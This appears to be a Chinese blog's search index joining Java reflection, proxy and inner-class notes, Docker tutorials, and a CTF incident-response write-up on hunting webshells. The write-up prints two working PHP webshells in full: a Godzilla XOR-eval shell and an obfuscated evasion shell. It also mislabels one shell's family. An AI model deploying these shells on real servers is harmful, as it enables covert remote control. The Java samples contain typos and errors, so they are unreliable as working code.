e.getClass().newInstance(); newInstance方法会调用默认的构造器初始化新创建的对象。如果这个类没有默认的构造器， 就会抛出一个异常。 将forName与newInstance配合起来使用，可以根据存储在字符串中的类名创建一个对象 String s = \"java.util.Random\"; Object m = Class.forName(s).newInstance(); ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:9:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 利用反射分析类的能力检查类的结构 在java.lang.reflect包中有三个类Field,Method 和Constructor 分别用户描述类的域、方法和构造器。这三个类都有一个叫getName的方法，用于返回项目的名称。Field 类有一个getType方法，用来返回描述域所属类型的Class对象。Method 和 Constructor类能有够报告参数类型的方法，Method 类还有一个可以报告返回类型的方法。这三个类还有一个叫getModifiers 的方法，它将返回一个整型数值，用不同的位开关描述 public 和static这样修饰符使用情况 Class 类中的 getFields、 getMethods 和 getConstructors 方 法 将 分 别 返 回 类 提 供 的 public 域、 方法和构造器数组，其中包括超类的公有成员 Class 类中的getDeclareFields、getDeclareMethods和getDeclareConstructors方法将返回类中声明的全部域、方法和构造器，其中包括私有和受保护成员，但不包括超类的成员。 写一个Demo import org.omg.CORBA.Object; import java.util.*; import java.lang.reflect.*; public class ReflectionTest { public static void main(String[] args) throws Exception{ String name; if(args.length \u003e 0) name = args[0]; else{ Scanner in = new Scanner(System.in); System.out.println(\"Enter class name (e.g. java.util.Date)\"); name = in.next(); } try{ Class cl = Class.forName(name); Class supercl = cl.getSuperclass(); String modifiers = Modifier.toString(cl.getModifiers()); if(modifiers.length() \u003e 0) System.out.println(modifiers + \" \") System.out.println(\"class \"+name); if(supercl != null \u0026\u0026 supercl != Object.class) System.out.println(\" extends \"+supercl.getName()); System.out.println(\"\\n{\\n\"); printConstructors(cl); System.out.println(); printMethods(cl); System.out.println(); printFields(cl); System.out.println(\"}\"); }catch(ClassNotFoundException e) { e.printStackce(); } } public static void printConstructors(Class cl){ Constructor[] constructors = cl.getDeclaredConstructors(); for(Constructor c :constructors){ String name = c.getName(); System.out.println(\" \"); String modifiers = Modifier.toString(c.getModifiers()); if(modifiers.length()\u003e0) System.out.println(modifiers + \" \"); System.out.println(name+\"(\"); Class[] paramTypes = c.getParameterTypes(); for(int j = 0;j\u003c paramTypes.length;j++){ if(j\u003e0) System.out.println(\", \"); System.out.println(paramTypes[j].getName()); } System.out.println(\");\"); } } public static void printMethods(Class cl){ Method[] methods = cl.getDeclaredMethods(); for(Method m:methods) { Class retType = m.getReturnType(); String name = m.getName(); System.out.println(\" \"); String modifiers = Modifier.toString(m.getModifiers()); if (modifiers.length() \u003e 0) System.out.println(modifiers + \" \"); System.out.println(retType.getName() + \" \" + name + \"(\"); Class[] paramTypes = m.getParameterTypes(); for (int j = 0; j \u003c paramTypes.length; j++) { if (j \u003e 0) System.out.println(\", \"); System.out.println(paramTypes[j].getName()); } System.out.println(\");\"); } } public static void printFields(Class cl){ Field[] fields = cl.getDeclaredFields(); for(Field f:fields){ Class type = f.getType(); String name = f.getName(); System.out.println(\" \"); String modifiers = Modifier.toString(f.getModifiers()); if(modifiers.length() \u003e 0) System.out.println(modifiers + \" \"); System.out.println(type.getName()+\" \"+name+\" \"); } } } Field[] getFields() 1.1 Filed[] getDeclaredFields() 1.1 getFields 方法将返回一个包含 Field 对象的数组， 这些对象记录了这个类或其超类的 公有域。 getDeclaredField 方法也将返回包含 Field 对象的数组， 这些对象记录了这个 类的全部域。 如果类中没有域， 或者 Class 对象描述的是基本类型或数组类型， 这些 方法将返回一个长度为 0 的数组。 Method[] getMethods() 1.1 Method[] getDeclareMethods() 1.1 返回包含 Method 对象的数组: getMethods 将返回所有的公有方法， 包括从超类继承 来的公有方法; getDeclaredMethods 返回这个类或接口的全部方法， 但不包括由超类 继承了的方法。 Constructor!] getConstructors() 1.1 ; Constructor;] getDeclaredConstructors() 1.1 返回包含 Constructor 对象的数组， 其中包含了 Class 对象所描述的类的所有公有构造 器(getConstructors) 或所有构造器(getDeclaredConstructors。) ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:9:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 在运行时使用反射分析对象查看对象域关键方法是Field 类中的 get 方法。如果 f 是一个Field类型的对象（例如，通过getDeclaredFields得到的对象），obj 是某个包含 f 域的类的对象，f.get(obj)，将返回一个对象，其值为 obj 域的当前值。例如 Employee harry = new Employee(\"Tom\",35000,10,1,1989); Class cl = harry.getClass(); Field f = cl.getDeclaredField(\"name\"); Object v = f.get(harry); //Tom 这样调用会出现问题，因为 name 是一个私有域，get 方法不能得到 为了能够调用，需要Field、Method或Constructor 对象的 setAccessible方法 例如 f.setAccessible(1); setAccessible方法是AccessibleObject 类中的一个方法，它是Field、Method 和Constructor 类的公共超类。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:9:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 调用任意方法Method 类中有一个 invoke 方法。它允许调用包装在当前Method 对象中的方法。invoke 方法的签名是 Object invoke(Object obj,Object... args) 第一个参数是隐式参数，其余的对象提供了显式参数 对于静态方法，第一个参数可以被忽略，可以将它设置为 null 例如m1代表Employee类的getName方法，下面这条语句显示了如何调用这个方法 String n = (String) m1.invoke(harry) 如果返回类型是基本类型，invoke方法会返回其包装器类型。例如，假设m2表示Employee类的getSalary方法，那么返回的对象实际上是一个Double，必须相应地完成类型转换。可以使用自动拆装将它转换为一个 double double s = (Double) m2.invoke(harry) 如何得到Method 对象呢？当然，可以通过调用getDeclareMethods方法，然后对返回的Method 对象数组进行查找，直到发现想要的方法为止。也可以通过调用Class 类中的getMethod方法得到想要的方法。 getMethod 的签名是 Method getMethod(String name,Class ...paramterTypes) 例如，下面说明了如何获得Employee 类的 getName 方法和raiseSalary 方法的方法指针 Method m1 = Employee.class.getMethod(\"getName\"); Method m2 = Employee.class.getMethod(\"raiseSalary\",double.class); 接口、lambda表达式与内部类","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:9:4","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 接口","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 接口概念在Java 程序设计语言中，接口不是类；而是对类的一组需求描述，这些类要遵从接口描述的统一格式进行定义 Arrays类中sort 方法承诺可以对对象数组进行排序，但要求满足下列前提：对象所属的类必须实现了Comparable接口 下面是Comparable接口的代码 public interface Comparable{ int compareTo(Object other); } 这就是说，任何实现Comparable 接口的类都需要包含compareTo方法，并且这个方法的参数必须是一个Object 对象，返回一个整形数值 接口可以看成没有实例域的抽象类， ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 接口的特性接口不是类，尤其不能使用 new 运算符实例化一个接口 尽管不能构造接口的对象，却能声明接口的变量 Comparable x // ok 接口变量必须引用实现了接口的类对象 x = new Employee(...); 可以使用instance检查一个对象是否实现了某个特定的接口 if(anObject instanceof Comparable){...} 与可以建立类的继承关系一样，接口也可以被扩展。这里允许存在多条从具有较高通用性的接口到较高专用性的接口的链。例如，假设有一个称为Moveable的接口 public interface Moveable{ void move(double x,double y); } 然后，可以以它为基础扩展一个叫做Powered的接口 public interface Powered extends Moveable{ double milesPerGallon(); } 虽然在接口中不能包含实例域或静态方法，但却可以包含常量。例如 public interface Powered extends Moveable { double milesPerGallon(); double SPEED_LIMIT = 95; } 与接口中的方法都自动地被设置为 public 一样，接口中的域将被自动设为public static final ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 接口与抽象类每个类可以实现多个接口，但是不能继承多个抽象类 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 接口与回调回调是一种常见的程序设计模式。在这种模式中，可以指出某个特定时间发生时应该才去的动作， Demo package timer; import java.awt.*; import java.awt.event.ActionEvent; import java.awt.event.ActionListener; import java.util.Date; import javax.swing.*; public class TimerTest { public static void main(String[] args) throws Exception { ActionListener listener = new TimePrinter(); Timer t = new Timer(3000, listener); t.start(); JOptionPane.showMessageDialog(null,\"Quit program?\"); System.exit(0); } } class TimePrinter implements ActionListener{ @Override public void actionPerformed(ActionEvent e) { System.out.println(\"At the tone,the time is \"+ new Date()); Toolkit.getDefaultToolkit().beep(); } } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:4","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 内部类内部类是定义在另一个类中的类。为什么需要使用内部类呢？其主要原因有如下三点 内部类方法可以访问该类定义所在作用域中的数据，包括私有的数据。 内部类可以对同一个包中的其他类隐藏起来 当想要定义一个回调函数且不想编写大量代码时，使用匿名内部类比较便捷 Demo package innerClass; import java.awt.*; import java.awt.event.ActionEvent; import java.awt.event.ActionListener; import java.util.*; import javax.swing.*; import javax.swing.Timer; public class InnerClassTest { public static void main(String[] args) { TalkingClock clock = new TalkingClock(3000, true); clock.start(); JOptionPane.showMessageDialog(null, \"Quit program?\"); System.exit(0); } } class TalkingClock{ private int interval; private boolean beep; public TalkingClock(int interval,boolean beep){ this.interval = interval; this.beep = beep; } public void start(){ ActionListener listenter = new TimePrinter(); Timer t = new Timer(interval,listenter); t.start(); } public class TimePrinter implements ActionListener{ @Override public void actionPerformed(ActionEvent e) { System.out.println(\"At the tone,the time is \"+ new Date()); if(beep) Toolkit.getDefaultToolkit().beep(); } } } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:5","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 内部类的特殊语法规则事实上，使用外部类引用的正规语法还要复杂一些 OuterClass.this 表示外围类的引用。例如，可以像下面这样编写TimePrinter 内部类的actionPerformed方法 public class TimePrinter implements ActionListener{ @Override public void actionPerformed(ActionEvent e) { System.out.println(\"At the tone,the time is \"+ new Date()); if(TalkingClock.this.beep) Toolkit.getDefaultToolkit().beep(); } } 在外部类的作用域，可以这样引用内部类 OuterClass.InnerClass ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:6","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 局部内部类在 start 方法中定义局部类 public void start(){ public class TimePrinter implements ActionListener{ @Override public void actionPerformed(ActionEvent e) { System.out.println(\"At the tone,the time is \"+ new Date()); if(beep) Toolkit.getDefaultToolkit().beep(); } } ActionListener listenter = new TimePrinter(); Timer t = new Timer(interval,listenter); t.start(); } 局部类不能用 public或private访问说明符进行声明。它的作用域被限定在声明这个局部类中 局部类有一个优势，对外部世界可以完全隐藏起来。即使TalkingClock 类中的其他代码也不能访问它。除start方法之外，没有任何方法知道TimePrinter类的存在 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:7","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 匿名内部类将局部内部类的使用再深入一步。假如只创建这个类的一个对象，就不必命名了。这种类被称为匿名内部类 public void start(){ ActionListener listener = new ActionListener(){ @Override public void actionPerformed(ActionEvent e) { System.out.println(\"At the tone,the time is \"+ new Date()); if(beep) Toolkit.getDefaultToolkit().beep(); } }; ActionListener listenter = new TimePrinter(); Timer t = new Timer(interval,listenter); t.start(); } 创建一个实现ActionListener 接口的类的新对象，需要实现的方法actionPerformed定义在括号{}内 语法格式为 new SuperType(construction parameters){ inner class methods and data } SuperType 可以是接口，也可以是一个类 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:8","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 代理利用代理可以在运行时创建一个实现了一组给定接口的新类 这种功能只有在编译时无法确定需要实现哪个接口时才有必要使用。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:11:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 何时使用代理代理类可以在运行时创建全新的类。这样的代理类能够实现指定的接口。尤其是，它具有下列方法 指定接口所需要的全部方法 Object 类中的全部方法，例如，toString、equals 等 然而，不能运行时定义这些方法的新代码。而是要提供一个调用处理器(invocationhandler)。调用处理器是实现了InvocationHandler 接口的类对象。在这个接口中只有一个方法： Object invoke(Object proxy,Method method,Object[] args) 无论何时调用代理对象的方法，调用处理器的invoke方法都会被调用，并向其传递Method对象和原始的调用参数。调用处理器必须给出处理调用的方式。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:11:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 创建代理对象要想创建一个代理对象，需使用Proxy 类的 newProxyInstance 方法。这个方法有三个参数 一个类加载器。 一个Class 对象数组，每个元素都是需要实现的接口。 一个调用处理器。 还有两个需要解决的问题。如何定义一个处理器？能够用结果代理对象做些什么？当然，这两个问题的答案取决于打算使用代理机制解决什么问题。使用代理可能出于很多种原因 例如 路由对远程服务器的调用 在程序运行期间，将用户接口事件与动作关联起来。 为调试、跟踪方法调用。 在示例程序中，使用代理和调用处理器跟踪方法调用，并且定义了一个TraceHandler 包装器类存储包装的对象。其中的 invoke 方法打印出被调用方法的名字和参数，随后用包装好的对象作为隐示参数调用这个方法 package ProxyTest; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; public class TraceHandler implements InvocationHandler { private Object target; public TraceHandler(Object t){ target = t; } @Override public Object invoke(Object proxy, Method m, Object[] args) throws Throwable { return m.invoke(target,args); } } 下面说明如何构造用于跟踪方法调用的代理对象 Object value = ...; // construct wrapper InvocationHandler handler = new TraceHandler(value); // construct proxy for one or more interfaces Class[] interfaces = new Class[] { Comparable.class }; Object proxy = Proxy.newProxylnstance(null, interfaces, handler); ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:11:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 代理类的特性所有代理类都扩展于Proxy 类。一个代理类只有一个实例域—调用处理器，它定义在Proxy 的超类中。为了履行代理对象的职责，所需要的任何附加数据都必须存储在调用处理器中。 在上面的代码中，代理Comparable对象时，TraceHandler 包装了实际的对象。 所有的代理类都覆盖了Object 类中的方法toString、equals和 hashCode。如同所有的代理方法一样，这些方法仅仅调用了调用处理器的 invoke。Object 类中的其他方法（如clone 和 getClass）没有被重新定义 java.Iang.reflect.InvocationHandler Object invoke(Object proxy,Method method,Object[] args) 定义了代理对象调用方法时希望执行的动作。 java.Iang.reflect.Proxy static Class\u003c?\u003e getProxyClass( ClassLoader interfaces) 返回实现指定接口的代理类。 static Object newProxyInstance( ClassLoader interfaces, InvocationHandler handler) 构造实现指定接口的代理类的一个新实例。 所有方法会调用给定处理器对象的 invoke 方法。 static boolean isProxyClass(Class\u003c?\u003e cl) 如果 cl 是一个代理类则返回 true。 部署Java 应用程序","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:11:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" JAR文件jar cvf jarfilename File1 File2 ... 例如 jar cvf CalculatorClasses.jar *.clsss icon.gif ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:12:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 清单文件除了类文件、图像和其他资源外，每个JAR文件还包含一个用于描述归档特征的清单文件(mainfest) 清单文件被命名为MANIFEST.MF，它位于JAR文件的一个特殊META-INF子目录中。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:12:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 可执行JAR文件可以使用 jar 命令中的 e 选项指定程序的入口点，即通常需要在调用 java 程序加载器时指定的类 jar cvfe MyProgram.jar com.mycompany.mypkg.MainAppClass files to add 不管哪一种方法，用户可以简单地通过下面命令来启动应用程序 java -jar MyProgram.jar 无论怎么样，人们对JAR文件中的Java 程序与本地文件有着不同的感觉。在Windows 平台中，可以使用第三方的包装器工具将JAR文件转换成Windows 可执行文件。包装器是一个大家数知的扩展名为.exe的Windows 程序，它可以查找和加载Java 虚拟机(JVM) ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:12:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" 容器数据卷容器之间可以有一个数据共享的技术 Docker 容器中产生的数据，同步到本地 目录的挂载，将我们容器内的目录，挂载到宿主机上面 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:1:0","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 使用数据卷方式一：直接使用命令来挂载 -v docker run -it -v 主目录:容器内目录 -p 主机端口:容器内端口 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:1:1","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 实战练习-MySQL docker pull mysql docker run -d --name mysql -p 3310:3306 -v ./mysql/conf:/etc/mysql/conf -v ./mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=huahua123 mysql ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:2:0","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 具名和匿名挂载 # 匿名挂载 -v 容器内路径 docker run -d -P --name nginx01 -v /etc/nginx nginx # 查看所有卷的情况 docker volume ls # 具名挂载 docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx nginx -v 卷名:容器内路径 所有的 docker 容器内的卷，没有指定目录的情况下都是在/var/lib/docker/volumes/xxx/_data -v 名字:容器内路径 #具名挂载 -v 容器内路径 #匿名挂载 -v /宿主机路径:容器内路径 #指定路径挂载 # ro readonly 只读 # rw readwrite 可读可写 docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:ro nginx ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:2:1","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" DockerfileDockerfile就是用来构建 docker 镜像的构建文件 FROM centos VOLUME ['volume01','volume02'] CMD echo \"---end---\" CMD /bin/bash 构建步骤 编写一个 dockerfile 文件 docker build 构建为一个镜像 docker run 运行镜像 docker push 发布镜像 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:3:0","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" Dockerfile构建过程基础知识 1、每个保留关键字(命令)都必须是大写字母 2、执行从上到下顺序执行 3、#表示注释 4、每一个指令都会创建一个新的镜像层，并提交 dockerfile 是面向开发的，以后发布项目，做镜像，就需要编写 dockerfile 文件 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:3:1","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" Dockerfile的命令 FROM #基础镜像 MAINTAINER #镜像是谁写的，姓名+邮箱 RUN #镜像构建的时候需要执行的命令 ADD #步骤：tomcat容器，这个 tomcat压缩包！添加内容 WORKDIR #镜像的工作目录 VOLUME #设置卷，挂载主机目录 EXPOSE #暴露端口配置 CMD #指定这个容器启动的时候需要运行的命令，只有最后一个生效，可被替代 ENTRYPOINT #指定这个容器启动的时候要运行的命令，可以追加命令 ONBUILD #当构建一个被继承Dockerfile 这个时候就会运行 ONBUILD 的命令，触发指令 COPY #类似 ADD，将文件拷贝到镜像中 ENV #构建的时候设置环境变量 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:3:2","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 实战练习-构建自己的 centos FROM centos MAINTAINER huahua\u003cexample@qq.com\u003e ENV MYPATH /usr/local WORKDIR $MYPATH RUN yum -y install vim RUN yum -y install net-tools EXPOSE 80 CMD echo $PATH CMD echo \"---end---\" CMD /bin/bash docker build -f dockerfile -t mycentos:0.1 . docker build -f dockerfile文件名 -t 镜像名[:TAG] . docker history 容器id 列出容器构建的记录 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:3:3","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" CMD和ENTRYPOINT的区别 CMD #指定这个容器启动的时候需要运行的命令，只有最后一个生效，可被替代 ENTRYPOINT #指定这个容器启动的时候要运行的命令，可以追加命令 dockerfile FROM centos CMD ['ls','-a'] docker run 容器id ls -al dockerfile FROM centos ENTRYPOINT ['ls','-a'] docker run 容器id -l ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:3:4","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 实战练习-Dockerfile制作tomcat镜像准备apache-tomcat和jdk的压缩包 FROM centos MAINTAINER huahua\u003cbeichenghua@gmail.com\u003e COPY readme.txt /usr/local/readme.txt ADD jdk-8u111-linux-x64.tar.gz /usr/local/ ADD apache-tomcat-9.0.85.tar.gz /usr/local/ RUN yum -y install vim RUN MYPATH /usr/local WORKDIR $MYPATH ENV JAVA_HOME /usr/local/jdk1.8.0_111 ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.85 ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.85 ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:CATALINA_HOME/bin EXPOSE 8080 CMD /usr/local/apache-tomcat-9.0.85/bin/startup.sh \u0026\u0026 tail -F /usr/local/apache-tomcat-9.0.85/logs/catalina.out docker build -t apache-tomcat:0.1 . ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:3:5","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 发布镜像到DockerHub/阿里镜像https://hub.docker.com/ docker tag imageId newImageName:tag docker push 镜像 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:4:0","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 容器互联 –linkdocker run -d -P --name tomcat03 --link tomcat02 tomcat tomcat03连接tomcat02，使用服务名连接 原理:在 hosts 文件中进行了配置 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:5:0","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 自定义网络docker network ls 查看 docker 所有的网络 网络模式 bridge：桥接 docker（默认） none：不配置网络 host：和宿主机共享网络 container：容器网络连通 --driver bridge 桥接模式 --subnet 192.168.0.0/16 网段 --gateway 192.168.0.1 网关(出网地址) docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:6:0","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" Docker-compose配置案例 # yaml 配置实例 version: '3' services: web: build: . ports: - \"5000:5000\" volumes: - .:/code - logvolume01:/var/log links: - redis redis: image: redis volumes: logvolume01: {} ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:7:0","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["应急响应"],"content":"任务要求 1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx} 2.黑客使用的什么工具的shell github地址的md5 flag{md5} 3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx 4.黑客免杀马完整路径 md5 flag{md5} 连上靶机之后，利用tar命令，压缩网站源码 tar -zcvf html.tar.gz /var/www/html 在线查杀网站进行查杀 在/var/www/html/include/gz.php文件下，发现第一个flag root@ip-10-0-10-3:/var/www/html# cat /var/www/html/include/gz.php \u003c?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } //027ccd04-5065-48b6-a32d-77c704a5e26d $payloadName='payload'; $key='3c6e0b8a9c15224a'; $data=file_get_contents(\"php://input\"); if ($data!==false){ $data=encode($data,$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,\"getBasicsInfo\")===false){ $payload=encode($payload,$key); } eval($payload); echo encode(@run($data),$key); }else{ if (strpos($data,\"getBasicsInfo\")!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } flag{027ccd04-5065-48b6-a32d-77c704a5e26d} 很明显是一个冰蝎马，找到 github地址进行提交 f10wers13eicheng@MacBookPro [21时41分00秒] [~/Desktop] -\u003e % md5 -s 'https://github.com/BeichenDream/Godzilla' MD5 (\"https://github.com/BeichenDream/Godzilla\") = 39392de3218c333f794befef07ac9257 flag{39392de3218c333f794befef07ac9257} 第三个 flag 是隐藏shell文件的路径/var/www/html/include/Db/.Mysqli.php f10wers13eicheng@MacBookPro [21时39分52秒] [~/Desktop] -\u003e % md5 -s '/var/www/html/include/Db/.Mysqli.php' MD5 (\"/var/www/html/include/Db/.Mysqli.php\") = aebac0e58cd6c5fad1695ee4d1ac1919 第四个 flag 为免杀马的路径，在河马查杀里边可以注意到一个特殊的 机器学习检测为webshell，进行查看 root@ip-10-0-10-3:/var/www/html# cat /var/www/html/wap/top.php \u003c?php $key = \"password\"; //ERsDHgEUC1hI $fun = base64_decode($_GET['func']); for($i=0;$i\u003cstrlen($fun);$i++){ $fun[$i] = $fun[$i]^$key[$i+1\u00267]; } $a = \"a\"; $s = \"s\"; $c=$a.$s.$_GET[\"func2\"]; $c($fun); 确实是免杀马 f10wers13eicheng@MacBookPro [21时39分59秒] [~/Desktop] -\u003e % md5 -s '/var/www/html/wap/top.php' MD5 (\"/var/www/html/wap/top.php\") = eeff2eabfd9b7a6d26fc1a53d3f7d1de flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de} ","date":"2024-01-31","objectID":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/:0:0","tags":["webshell查杀"],"title":"第一章 应急响应Webshell查杀","uri":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/"},{"categories":["运维"],"content":" Docker的常用命令","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:0:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" 帮助命令 docker version #显示 docker 的版本 docker info #显示 docker 的系统信息：包括镜像和容器的数量 docker 命令 --help #帮助命令 ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:1:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" 镜像命令docker images 查看所有镜像 f10wers13eicheng@MacBookPro [12时12分59秒] [/Library/Java/JavaVirtualMachines] -\u003e % docker images REPOSITORY TAG IMAGE ID CREATED SIZE hello-world latest feb5d9fea6a5 2 years ago 13.3kB # 解释 REPOSITORY 镜像的仓库源 TAG 镜像的标签 IMAGE ID 镜像的id CREATED 镜像的创建时间 SIZE 镜像的大小 -a # 列出所有镜像 -q # 显示镜像id docker search 镜像名 搜索镜像 f10wers13eicheng@MacBookPro [12时25分22秒] [/Library/Java/JavaVirtualMachines] -\u003e % docker search mysql NAME DESCRIPTION STARS OFFICIAL AUTOMATED mysql MySQL is a widely used, open-source relation… 14805 [OK] mariadb MariaDB Server is a high performing open sou… 5653 [OK] percona Percona Server is a fork of the MySQL relati… 623 [OK] phpmyadmin phpMyAdmin - A web interface for MySQL and M… 934 [OK] bitnami/mysql Bitnami MySQL Docker Image 106 [OK] bitnami/mysqld-exporter 6 cimg/mysql 